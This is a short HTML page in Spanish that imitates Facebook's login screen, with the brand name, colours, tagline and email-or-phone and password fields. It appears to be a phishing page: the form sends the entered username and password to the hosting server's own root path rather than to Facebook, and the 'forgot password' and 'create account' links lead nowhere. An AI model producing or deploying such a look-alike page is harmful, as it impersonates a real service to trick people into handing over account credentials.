<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Iniciar sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .container {
            display: flex;
            width: 980px;
            justify-content: space-between;
            align-items: center;
        }

        .left {
            width: 50%;
        }

        .left h1 {
            color: #1877f2;
            font-size: 62px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .left p {
            font-size: 26px;
            color: #333;
        }

        .right {
            width: 50%;
            display: flex;
            justify-content: center;
        }

        .login-box {
            width: 396px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .login-box input {
            width: 90%;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 5px;
            font-size: 16px;
        }

        .login-box button {
            width: 100%;
            padding: 15px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }

        .login-box button:hover {
            background: #166fe5;
        }

        .forgot {
            display: block;
            margin-top: 10px;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot:hover {
            text-decoration: underline;
        }

        .create-account {
            margin-top: 15px;
            display: block;
            background: #42b72a;
            padding: 15px;
            color: white;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            text-decoration: none;
            text-align: center;
        }

        .create-account:hover {
            background: #36a420;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="right">
            <div class="login-box">
                <form action="/" method="POST">
                    <input type="text" name="username" placeholder="Correo electrónico o número de teléfono" required><br>
                    <input type="password" name="password" placeholder="Contraseña" required><br>
                    <button type="submit">Iniciar sesión</button>
                </form>
                <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
                <a href="#" class="create-account">Crear cuenta nueva</a>
            </div>
        </div>
    </div>
</body>
</html>
